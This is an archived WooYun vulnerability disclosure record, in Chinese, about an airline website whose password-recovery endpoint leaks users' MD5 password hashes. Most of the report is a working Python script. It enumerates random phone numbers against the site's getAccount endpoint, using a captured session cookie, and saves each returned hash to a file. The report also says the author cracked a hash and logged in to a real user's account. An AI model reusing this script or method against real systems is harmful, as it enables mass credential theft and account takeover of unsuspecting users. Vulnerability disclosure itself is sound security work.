{"id": 32841, "wybug_id": "wooyun-2015-0110220", "wybug_title": "蓝天航空官网用户密码泄露", "wybug_corp": "蓝天航空", "wybug_author": "晨曦遇晓", "wybug_date": "2015-05-05 16:49", "wybug_open_date": "2015-06-19 16:50", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["密码泄露"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-05-05：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2015-06-19：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 蓝天航空官网用户密码泄露。 详细说明：  蓝天航空，网连天下。官网地址：http://www.952111.com/贴上脚本代码：#!/usr/bin/python#coding=utf8import jsonimport urllibimport httplibimport randomimport requestsimport timeimport threadingdef test():    while True:        phoneNo=random.choice(['182'])+''.join(random.sample('0123456789',8))        data={\"mobile\":phoneNo}        body=urllib.urlencode(data)        headers={\"User-Agent\":\"Mozilla/5.0 (Windows NT 6.3; WOW64; rv:37.0) Gecko/20100101 Firefox/37.0\",                 \"Accept\":\"application/json, text/javascript, */*; q=0.01\",                 \"Accept-Language\":\"zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3\",                 \"Accept-Encoding\":\"gzip, deflate\",                 \"Content-Type\":\"application/x-www-form-urlencoded; charset=UTF-8\",                 \"X-Requested-With\":\"XMLHttpRequest\",                 \"Referer\":\"http://www.952111.com/member/findpwd/checkpass?mobile=18722103783&authcode=123456\",                 \"Content-Length\":\"18\",                 \"Cookie\":\"Hm_lvt_e87753b349bd4094206d8dd4e0df514a=1429783095,1429848025; JSESSIONID=de4a19cd-50aa-4d3e-ba17-68a1919d3cd7; iwapp=7pevvhesj7kiilhf4t6t5dpquxs5w6md3mf5punacr6jpsjdp3lino4gdhy3zxqq3abf6qjvupgbo; Hm_lpvt_e87753b349bd4094206d8dd4e0df514a=1429851600\",                 \"Connection\":\"keep-alive\",                 \"Pragma\":\"no-cache\",                 \"Cache-Control\":\"no-cache\"                 }        #rtime=int(time.time())        url=\"http://www.952111.com/getAccount\"        httpClient=httplib.HTTPConnection(\"www.952111.com\",\"80\")        httpClient.request(\"POST\", url, body, headers)        response=httpClient.getresponse()        rep=response.read()        print rep        print type(rep)        result=json.loads(rep)        print result        print type(result)        a=result.get(\"result\")        print a        print type(a)        if a:            print \"test\"            f=open(\"D://test.txt\",\"a\")            f.write(str(phoneNo)+\" md5:\"+str(result.get(\"data\").get(\"loginpwd\"))+\"\\n\")            f.close()if __name__==\"__main__\":    t=threading.Thread(target=test)    t.run()     漏洞证明：  1、用户使用找回密码功能。\n\n2、点击下一步的时候，服务器返回该手机号注册时的登录密码。\n\n3、发现返回的密码使用md5加密，解密出明文。\n\n4、返回用户登录密码的url可以重放。\n\n本来写了个重放脚本的，搞了几个后，显示服务器繁忙进不去官网了，郁闷。5、在一个用户的登录密码，md5解密。\n\n6、用解密密码登录，成功。\n\n在手机客户端进行用户注册，不需要验证手机号，可以任意账号注册。   修复方案：  你懂   版权声明：转载请注明来源 晨曦遇晓@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}